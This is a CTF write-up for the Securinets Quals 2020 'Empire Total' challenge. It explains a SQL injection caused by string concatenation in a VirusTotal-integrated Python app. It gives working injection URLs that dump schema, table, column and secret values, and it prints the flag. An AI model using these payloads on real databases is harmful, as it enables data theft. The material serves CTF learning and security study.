I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors \u0026lt;3 ) i found something interesting :D\nbefore we proceed here\u0026rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)\ndef persistURLs(self,selected_ips,ip_report_filtered): attr=\u0026quot;detected_urls\u0026quot; table_name=\u0026quot;vt_scanned_urls_table\u0026quot; newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name) selected_urls_filtered=[] for selected_url in selected_urls: selected_urls_filtered.append(selected_url['url']) if newAttr in ip_report_filtered: for url in ip_report_filtered[newAttr]: print(url['URL']) if url['URL'] not in selected_urls_filtered: try: self.CursorRW.execute(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) self.DBRW.commit() self.resetSQL() except Exception as e: print(\u0026quot;INSERT INTO \u0026quot;+table_name+\u0026quot; (ip_id,url,detections,scanned_time) VALUES ('\u0026quot;+str(selected_ips[0]['id'])+\u0026quot;','\u0026quot;+url['URL']+\u0026quot;','\u0026quot;+url['Detections']+\u0026quot;','\u0026quot;+url['Scanned']+\u0026quot;')\u0026quot;) print(\u0026quot;EXCEPTION: \u0026quot;,e) self.resetSQL()  Exploitation So the idea is that if we go to VirusTotal website (https://www.virustotal.com/) and scan a url ,and then go back to our challenge website and scan the url\u0026rsquo;s ip we will find that the url we scanned in VirusTotal website will appear , it\u0026rsquo;s pretty confusing i know so let\u0026rsquo;s have an example\n We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )   http://100.26.206.184/?u=Just testing for the writeup :p\n Now we go back to the challenge website and scan the ip address  Yeeees ! it\u0026rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.\nNow here is our scenario , if we look to the vulnerable function persistURLs in VirusTotal.py we can notice the injection in this query (line 430)\n INSERT INTO \u0026ldquo;+table_name+\u0026rdquo; (ip_id,url,detections,scanned_time) VALUES ('\u0026ldquo;+str(selected_ips[0][\u0026lsquo;id\u0026rsquo;])+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;URL\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Detections\u0026rsquo;]+\u0026rdquo;','\u0026ldquo;+url[\u0026lsquo;Scanned\u0026rsquo;]+\u0026rdquo;')\n We have control over the url[\u0026lsquo;URL\u0026rsquo;] parameter (the url we scan in VirusTotal Website) so it\u0026rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :\n The url encoding %20 that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass: /**/ The second thing faced me when i was solving the challenge , we can\u0026rsquo;t use \u0026ndash; - to equilibrate the SQL query so we will have to find a solution to equilibrate it  In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it  HERE\nFinally I opted to this solution, here is the URL we will scan :\n http://100.26.206.184/?u=\u0026rsquo;,(select//1),(select//2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n The complete SQL query that will be executed is :\n INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (\u0026lsquo;2\u0026rsquo;,\u0026lsquo;100.26.206.184/?u=\u0026rsquo;,(select 1),(select 2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\u0026rsquo;,\u0026lsquo;15\u0026rsquo;,\u0026lsquo;yes\u0026rsquo;)\n Let\u0026rsquo;s try it now , we first scan it in VirusTotal :\nAnd now let\u0026rsquo;s scan the IP in the challenge website :\nIt\u0026rsquo;s fetched successfully, let\u0026rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :\nBingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:\n Dump DB names :   http://100.26.206.184/?u=\u0026rsquo;,(select//gRoUp_cOncaT(0x7c,schema_name,0x7c)//fRoM//information_schema.schemata),(select//2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n DBName : MySecretDatabase\nDump Tables and Columns :   http://100.26.206.184/?u=\u0026rsquo;,(select//gRoUp_cOncaT(0x7c,table_name,0x7c)//fRoM//information_schema.tables),(select//2)),(\u0026lsquo;102\u0026rsquo;,\u0026lsquo;a\n  http://100.26.206.184/?u=\u0026rsquo;,(select//gRoUp_cOncaT(0x7c,column_name,0x7c)//fRoM//information_schema.columns),(select//2)),(\u0026lsquo;103\u0026rsquo;,\u0026lsquo;a\n Table Name : SecretTable \u0026amp; Column Name : secret_value\nAnd finally let\u0026rsquo;s have our beloved flag :   http://100.26.206.184/?u=\u0026rsquo;,(select//group_concat(0x7c,secret_value,0x7c)//fRoM//MySecretDatabase.SecretTable),(select//2)),(\u0026lsquo;109\u0026rsquo;,\u0026lsquo;a\n Yees We did it , FLAG : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}\nI have really liked the idea of the challenge, it\u0026rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.\nI hope you liked the writeup if you have any questions don\u0026rsquo;t hesitate to contact me Twitter : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd\n","date":1584748800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584748800,"objectID":"5442b7b56fe4b087fc22ba29c9195065","permalink":"/post/empire-total-securinetsquals20/","publishdate":"2020-03-21T00:00:00Z","relpermalink":"/post/empire-total-securinetsquals20/","section":"post","summary":"Empire Total (1000pts) (7 Solves) This task was really so creative and i had so fun solving it , but i can\u0026rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let\u0026rsquo;s download it and begin our trip xD","tags":null,"title":"Empire Total - Securinets Quals 20","type":"post"}]
